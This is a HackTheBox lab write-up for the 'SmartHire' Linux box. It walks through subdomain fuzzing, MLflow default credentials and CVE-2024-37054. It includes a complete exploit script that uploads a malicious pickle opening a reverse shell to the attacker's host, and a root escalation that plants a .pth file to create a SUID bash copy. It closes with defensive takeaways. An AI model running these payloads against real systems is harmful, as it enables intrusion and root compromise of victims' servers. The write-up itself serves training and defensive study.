# SmartHire — HackTheBox Writeup

**Difficulty:** Medium
**OS:** Linux
**Target IP:** `10.129.xx.xx`
**Attacker (VPN) IP:** `10.10.xx.xx`

---

## 1. Overview

SmartHire is a Linux box centered around **MLflow**, a popular open-source machine learning lifecycle platform. The path to root involves:

1. Discovering a hidden MLflow subdomain via virtual-host fuzzing.
2. Logging into MLflow with default credentials.
3. Exploiting **CVE-2024-37054** — a pickle deserialization RCE in vulnerable MLflow versions — to get a shell as `svcweb`.
4. Abusing a sudo-permitted admin script (`mlflowctl.py`) that dynamically loads Python plugins from a group-writable directory, using a `.pth` file to escalate to `root`.

---

## 2. Reconnaissance

### 2.1 Nmap Scan

The first step, as always, was a service/version scan against the target:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Output:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-17 00:56 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.57s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 [REDACTED] (ECDSA)
|_  256 [REDACTED] (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.94 seconds
```

**What this tells us:**
- Only two ports are open: SSH (22) and HTTP (80).
- The webserver redirects to `http://smarthire.htb/` — meaning the server expects a specific `Host` header/domain name rather than being reachable by raw IP. This is a strong hint we need to add a hosts file entry.
- SSH host key fingerprints are omitted here since they're not needed for exploitation and are unique per-instance (redacted for cleanliness).

### 2.2 Adding the Host Entry

Since the HTTP service redirects based on the `Host` header, we add the domain to `/etc/hosts` so our browser/tools resolve it to the target IP:

```bash
cat /etc/hosts
```

```
10.129.xx.xx   smarthire.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

At this point `http://smarthire.htb/` loads normally in the browser — this is the main "SmartHire" web application (an HR/hiring platform, based on later context like `/upload_hiring_data` and `/predict` endpoints).

---

## 3. Web / Subdomain Enumeration

Since ML-themed applications frequently split their front-end and MLOps tooling across subdomains, we fuzz for virtual hosts under `smarthire.htb`:

```bash
ffuf -u http://smarthire.htb/ -H "Host: FUZZ.smarthire.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fc 301
```

**Output:**

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://smarthire.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.smarthire.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

models                  [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 239ms]
:: Progress: [20000/20000] :: Job [1/1] :: 149 req/sec :: Duration: [0:01:55] :: Errors: 0 ::
```

This reveals a subdomain: **`models.smarthire.htb`**, which returns a `401 Unauthorized` — meaning something is listening there but requires authentication. This is added to `/etc/hosts` as well:

```bash
cat /etc/hosts
```

```
10.129.xx.xx   smarthire.htb models.smarthire.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

---

## 4. Identifying and Accessing MLflow

Visiting `http://models.smarthire.htb`, the login prompt and page structure identify the service as **MLflow** — an open-source platform used for tracking ML experiments, model registries, and model serving.

### 4.1 Default Credentials Check

MLflow's Basic Auth plugin ships with a well-known default administrator account. Rather than assuming it, this was **tested directly** against the login prompt:

- Username: `admin`
- Password: `password`

**Result:** Authentication succeeded. This confirms the instance was never hardened past its default configuration — a classic "default credentials" weakness, and the entry point into the MLOps side of the box.

> **Why this matters:** MLflow (and many self-hosted ML tooling platforms) ship with a default `admin:password` combo for the built-in basic-auth module. If an administrator doesn't rotate this during setup, anyone who fingerprints MLflow can log in with zero prior knowledge — no brute-force needed, just publicly documented defaults.

### 4.2 Version Fingerprinting

Once inside MLflow's UI/API, the version banner/API responses identified the running version as:

```
MLflow v2.14.1
```

This version is affected by a known critical vulnerability.

---

## 5. Vulnerability: CVE-2024-37054

**CVE-2024-37054** — Deserialization of untrusted data in MLflow. Certain MLflow versions allow a maliciously crafted **PyFunc model** (stored as a Python pickle file, `python_model.pkl`) to be uploaded into the model registry. When a victim (or the platform itself, via `/predict` style invocation) loads/interacts with that model, the pickle is deserialized — and Python's `pickle` module will happily execute arbitrary code embedded via a `__reduce__` method during that deserialization.

**Public reference / PoC used as the exploitation base:**
`https://github.com/NiteeshPujari/CVE-2024-37054-MLflow-RCE`

The general attack chain:
1. Authenticate to the target web app (SmartHire) to reach the ML-related upload/predict endpoints it exposes to end users.
2. Use those endpoints (or the MLflow API directly with the admin creds) to register/train a new model version, producing a fresh `run_id`.
3. Overwrite that run's `python_model.pkl` artifact with a **malicious pickle** whose `__reduce__` method runs an OS command (in this case, a reverse shell) instead of legitimate model logic.
4. Trigger a prediction against that model — MLflow deserializes the pickle to load the "model," and our payload executes instead.

---

## 6. Exploitation

### 6.1 The Exploit Script

Based on the public PoC, the script was modified to:
- Register a throwaway account and log into the SmartHire web app.
- Upload a legitimate-looking training CSV to `/upload_hiring_data` so the app registers a new MLflow model version (this creates a fresh `run_id` we can target).
- Query the MLflow REST API directly (using the default admin creds) to find that new `run_id`.
- **PUT** a malicious pickle over the model's `python_model.pkl` artifact via MLflow's artifact-store API.
- Call `/predict` on the SmartHire app, which causes the backend to load the (now-malicious) model and execute the embedded reverse shell command.

```python
#!/usr/bin/env python3
"""
SmartHire - MLflow Pickle Deserialization RCE
Usage: python3 exploit.py <LHOST> <LPORT>
"""

import pickle
import os
import sys
import time
import requests

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
    sys.exit(1)

LHOST = sys.argv[1]
LPORT = sys.argv[2]

TARGET  = "http://smarthire.htb"
MLFLOW  = "http://models.smarthire.htb"
MLCREDS = ("admin", "password")

TRAIN_CSV = b"name,skills,experience,education,position_applied,previous_company\nAlice,Python,48,Masters,Eng,Corp\nBob,Java,72,Bachelors,Dev,Inc\n"
PRED_CSV  = b"name,skills,experience,education,position_applied,previous_company\nTest,Python,24,Bachelors,Eng,Co\n"

class ReverseShell:
    def __reduce__(self):
        cmd = (
            f"python3 -c '"
            f"import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])'"
        )
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())

# ── Login ─────────────────────────────────────────────────────────────────────
print("[*] Logging in...")
sess = requests.Session()
r = sess.post(f"{TARGET}/login",
              data={"username": "hello", "password": "password"},
              allow_redirects=True)

print(f"[DEBUG] Login status: {r.status_code} | Final URL: {r.url}")
print(f"[DEBUG] Cookies: {sess.cookies.get_dict()}")

if "login" in r.url.lower():
    print("[!] Login failed — still on login page"); sys.exit(1)
print("[+] Logged in successfully")

# ── Train a fresh model ────────────────────────────────────────────────────────
print("[*] Uploading training CSV to register a new model version...")
r = sess.post(f"{TARGET}/upload_hiring_data",
              files={"file": ("train.csv", TRAIN_CSV, "text/csv")})

print(f"[DEBUG] Upload status: {r.status_code}")
print(f"[DEBUG] Upload response: {r.text[:500]}")

if r.status_code == 302 or "login" in r.text.lower():
    print("[!] Got redirected to login — session not authenticated"); sys.exit(1)

if not r.text.strip():
    print("[!] Empty response from /upload_hiring_data"); sys.exit(1)

try:
    resp_json = r.json()
    version = resp_json.get("model_info", {}).get("version", "?")
except Exception as e:
    print(f"[!] Failed to parse JSON: {e}")
    print(f"[!] Raw response: {r.text}")
    sys.exit(1)

print(f"[+] Registered model version {version}")

# ── Grab the run_id MLflow just created ───────────────────────────────────────
print("[*] Fetching new run_id from MLflow API...")
r = requests.post(
    f"{MLFLOW}/api/2.0/mlflow/runs/search",
    json={"experiment_ids": ["0"], "max_results": 1},
    auth=MLCREDS
)

print(f"[DEBUG] MLflow search status: {r.status_code}")
print(f"[DEBUG] MLflow response: {r.text[:300]}")

try:
    run_id = r.json()["runs"][0]["info"]["run_id"]
except Exception as e:
    print(f"[!] Failed to get run_id: {e}"); sys.exit(1)

print(f"[+] run_id: {run_id}")

# ── Overwrite python_model.pkl with malicious pickle ──────────────────────────
print("[*] Replacing python_model.pkl with malicious pickle...")
url = f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/python_model.pkl"
r = requests.put(url, data=payload, auth=MLCREDS,
                 headers={"Content-Type": "application/octet-stream"})

print(f"[DEBUG] PUT status: {r.status_code} | Response: {r.text[:200]}")

if r.status_code != 200:
    print(f"[!] Upload failed: {r.status_code} {r.text}"); sys.exit(1)
print(f"[+] Malicious pickle uploaded ({len(payload)} bytes)")

# ── Trigger prediction ────────────────────────────────────────────────────────
print(f"[*] Triggering /predict — watch your listener on {LHOST}:{LPORT} ...")
try:
    sess.post(f"{TARGET}/predict",
              files={"file": ("pred.csv", PRED_CSV, "text/csv")},
              timeout=20)
except requests.exceptions.Timeout:
    pass  # expected — shell holds the connection open

print("[+] Request sent. If the shell didn't arrive, the server may block outbound TCP.")
```

**Notes on how this pickle trick works (in plain terms):**
Python's `pickle` format isn't just "data" — it can also encode instructions to *call functions* while an object is being rebuilt. If a class defines a `__reduce__` method, pickle will call whatever function that method returns during deserialization. Here, `ReverseShell.__reduce__` tells pickle: "when you rebuild me, just call `os.system(cmd)`." So the moment MLflow (or the app using it) tries to unpickle this "model" to serve a prediction, it isn't loading a model at all — it's executing our reverse shell command as if it were legitimate model-loading code.

### 6.2 Running the Exploit

```bash
python3 smarthire.py 10.10.xx.xx 4444
```

**Output:**

```
[*] Logging in...
[DEBUG] Login status: 200 | Final URL: http://smarthire.htb/dashboard
[DEBUG] Cookies: {'session': '[REDACTED_SESSION_TOKEN]'}
[+] Logged in successfully
[*] Uploading training CSV to register a new model version...
[DEBUG] Upload status: 200
[DEBUG] Upload response: {"message":"Model trained and registered successfully","model_deleted":false,"model_info":{"creation_timestamp":1779857621782,"description":"No description","version":"1"},"registered_model":"anything-6b1b124ea6bb-model","status":"success"}

[+] Registered model version 1
[*] Fetching new run_id from MLflow API...
[DEBUG] MLflow search status: 200
[DEBUG] MLflow response: {
  "runs": [
    {
      "info": {
        "run_uuid": "2afe7908a23b46aeb47b071575ebb9e8",
        "experiment_id": "0",
        "run_name": "peaceful-ant-715",
        "user_id": "admin",
        "status": "FINISHED",
        "start_time": 1779857615898,
        "end_time": 1779857621795,

[+] run_id: 2afe7908a23b46aeb47b071575ebb9e8
[*] Replacing python_model.pkl with malicious pickle...
[DEBUG] PUT status: 200 | Response: {}
[+] Malicious pickle uploaded (263 bytes)
[*] Triggering /predict — watch your listener on 10.10.xx.xx:4444 ...
```

The session cookie shown by the tool during the run was redacted above — it's a signed Flask session token unique to that login and not needed to reproduce the attack.

### 6.3 Catching the Shell

A listener was set up beforehand using `penelope` (a reverse-shell handling tool that auto-upgrades the shell to a full PTY):

```bash
penelope -p 4444
```

**Output:**

```
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.100 • 172.17.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from smarthire~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/smarthire~10.129.xx.xx-Linux-x86_64/2026_05_27-04_49_03-066.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
svcweb@smarthire:/var/www/smarthire.htb$
```

We land a shell as **`svcweb`** — the service account running the SmartHire web application (which internally talks to MLflow to train/serve models).

---

## 7. User Flag

```bash
svcweb@smarthire:~$ cat user.txt
[REDACTED_USER_FLAG]
```

---

## 8. Privilege Escalation Enumeration

### 8.1 Checking sudo Permissions

The first standard check on any foothold: what can this user run as another user without a password?

```bash
svcweb@smarthire:~$ sudo -l
```

**Output:**

```
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

`svcweb` can run `/opt/tools/mlflow_ctl/mlflowctl.py` **as root, with no password, and with any arguments** (`*`). This script is our next target.

### 8.2 Reading the Sudo-Permitted Script

```bash
svcweb@smarthire:~$ cat /opt/tools/mlflow_ctl/mlflowctl.py
```

**Output:**

```python
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```

**Why this is dangerous — explained simply:**

The script loops through every subdirectory inside `plugins/` and calls `site.addsitedir(str(path))` on each one. `site.addsitedir()` is a Python standard-library function normally used to register extra locations for importable packages — but it has a lesser-known side effect: **if it finds any file ending in `.pth` inside that directory, and a line in that file starts with `import `, Python will execute that line as code**, immediately, as soon as the directory is processed. This `.pth` file mechanism is a legitimate CPython feature (meant for things like editable-install path configuration), but it becomes a code-execution primitive if an attacker can drop an arbitrary `.pth` file into any directory that gets passed to `addsitedir()`.

So the real question becomes: **can `svcweb` write into any of the `plugins/` subdirectories?**

### 8.3 Checking Plugin Directory Permissions

```bash
svcweb@smarthire:~$ ls -la /opt/tools/mlflow_ctl/plugins
```

**Output:**

```
total 16
drwxr-xr-x 4 root root 4096 Feb 19 18:10 .
drwxr-xr-x 3 root root 4096 Feb 19 18:16 ..
drwxr-xr-x 3 root root 4096 Feb 20 09:26 core
drwxrwxr-x 2 root devs 4096 May 12 15:22 dev
```

Two subdirectories exist:
- `core/` → owned by `root:root`, not writable by anyone else (`rwxr-xr-x`).
- `dev/` → owned by `root:devs`, and critically, **group `devs` has write permission** (`rwxrwxr-x`).

This means: **any user who is a member of the `devs` group can write files into `plugins/dev/`**, and since `mlflowctl.py` runs `site.addsitedir()` on *every* directory in `plugins/`, anything dropped in `dev/` gets processed the same way as legitimate plugins — including any `.pth` file we plant.

### 8.4 Confirming Group Membership (Proof of the Weakness)

Before relying on this, we verify `svcweb` is actually in the `devs` group — this is the exact condition needed for the privilege escalation to work:

```bash
svcweb@smarthire:~$ id
```

**Output:**

```
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Confirmed: `svcweb` belongs to `mlflowweb` **and** `devs`. This is the missing piece that turns "we found a writable directory" into "we can actually exploit it as this user" — the group membership check was explicitly done here rather than assumed.

---

## 9. Exploitation — Root via `.pth` Injection

### 9.1 Planting the Malicious `.pth` File

We write a `.pth` file into the writable `plugins/dev/` directory. Any line beginning with `import` in a `.pth` file is executed by Python when the directory is added via `site.addsitedir()`. Our payload copies `/bin/bash` to `/tmp` and sets the SUID bit on it, so it runs with root's permissions no matter who invokes it:

```bash
svcweb@smarthire:~$ echo "import os; os.system('cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash')" > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
```

### 9.2 Triggering Execution via the Sudo-Permitted Script

Now we simply run the allowed sudo command with the harmless `status` argument — we don't need `backup-models` or anything destructive, because the malicious code runs the instant the `plugins/` folder is scanned, **before** the script even looks at what action was requested:

```bash
svcweb@smarthire:~$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

**Output:**

```
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up 19 minutes'
```

The command runs normally and shows nothing suspicious on the surface — but because it ran as root (via sudo) and processed our poisoned `plugins/dev/` directory along the way, our `.pth` payload executed with **root privileges** in the background.

### 9.3 Verifying the SUID Shell Was Created

```bash
svcweb@smarthire:~$ ls -la /tmp/rootbash
```

**Output:**

```
-rwsr-sr-x 1 root root 1396520 May 27 05:06 /tmp/rootbash
```

The `s` bits in the permission string (`rws` and `r-s`) confirm the SUID and SGID bits are set, and the file is owned by `root:root`. This binary will now run with root's effective privileges regardless of who executes it.

### 9.4 Getting a Root Shell

```bash
svcweb@smarthire:~$ /tmp/rootbash -p
```

The `-p` flag tells bash to preserve the effective UID/GID rather than dropping privileges back to the real user (bash normally drops SUID privileges unless told not to).

```bash
rootbash-5.1# id
```

**Output:**

```
uid=1000(svcweb) gid=1000(svcweb) euid=0(root) egid=0(root) groups=0(root),1000(svcweb),1001(mlflowweb),1002(devs)
```

`euid=0(root)` confirms we now have **effective root** privileges.

---

## 10. Root Flag

```bash
rootbash-5.1# cat root.txt
[REDACTED_ROOT_FLAG]
```

---

## 11. Step-by-Step Summary

| # | Step | Action |
|---|------|--------|
| 1 | Recon | `nmap -sV -sC` on target → found SSH (22) and HTTP (80, nginx), with HTTP redirecting to `smarthire.htb` |
| 2 | Hosts setup | Added `smarthire.htb` to `/etc/hosts` pointing at target IP |
| 3 | Vhost fuzzing | `ffuf` against `Host: FUZZ.smarthire.htb` found subdomain `models` (401 Unauthorized) |
| 4 | Hosts setup #2 | Added `models.smarthire.htb` to `/etc/hosts` |
| 5 | Service ID | Identified `models.smarthire.htb` as an **MLflow** login (v2.14.1) |
| 6 | Default creds | Confirmed `admin:password` worked against MLflow's basic-auth login (tested, not assumed) |
| 7 | Vuln ID | Matched version to **CVE-2024-37054** (pickle deserialization RCE via malicious PyFunc model) — PoC: `https://github.com/NiteeshPujari/CVE-2024-37054-MLflow-RCE` |
| 8 | Exploit prep | Registered a throwaway SmartHire web account, logged in |
| 9 | Model creation | Uploaded a CSV to `/upload_hiring_data` to force a new MLflow model version + run_id |
| 10 | Locate run | Queried MLflow's `/api/2.0/mlflow/runs/search` (with admin creds) to get the fresh `run_id` |
| 11 | Malicious pickle | `PUT` a pickle with a `__reduce__`-based reverse shell over `python_model.pkl` for that run |
| 12 | Trigger RCE | Called `/predict` on the SmartHire app; MLflow deserialized our pickle → executed the reverse shell |
| 13 | Shell caught | `penelope` listener received connection, auto-upgraded to PTY → shell as `svcweb` |
| 14 | User flag | Read `user.txt` from `svcweb`'s home directory |
| 15 | Sudo check | `sudo -l` showed `svcweb` can run `/opt/tools/mlflow_ctl/mlflowctl.py *` as root, no password |
| 16 | Script review | Read `mlflowctl.py` — found it calls `site.addsitedir()` on every subfolder in `plugins/`, which executes any `.pth` file's `import` lines |
| 17 | Permission check | `ls -la plugins/` showed `plugins/dev/` was group-writable by `devs` |
| 18 | Group proof | `id` confirmed `svcweb` is a member of the `devs` group — verifying the escalation path is actually usable, not just theoretically writable |
| 19 | Payload drop | Wrote a `.pth` file into `plugins/dev/` that copies `/bin/bash` to `/tmp/rootbash` and sets SUID |
| 20 | Trigger | Ran the allowed sudo command (`mlflowctl.py status`) — this silently executed the `.pth` payload as root |
| 21 | Verify | Confirmed `/tmp/rootbash` had SUID (`rws`) bits set and was owned by root |
| 22 | Root shell | Ran `/tmp/rootbash -p` to preserve elevated privileges → `euid=0(root)` |
| 23 | Root flag | Read `root.txt` |

**Key takeaways for defenders:**
- Never leave default credentials (`admin:password`) active on internal tools like MLflow, even if they're "internal only."
- Keep MLOps platforms patched — CVE-2024-37054 and similar deserialization bugs are actively exploited once an attacker can upload models.
- Avoid granting broad, wildcard `sudo` permissions (`command *`) for scripts that dynamically load code from writable locations — `site.addsitedir()` + group-writable plugin directories is a dangerous combination.
- Audit group memberships (`devs` here) regularly — a group added for convenience (e.g., letting developers drop in plugins) can become a privilege-escalation path if it overlaps with a service account that also has sudo rights.
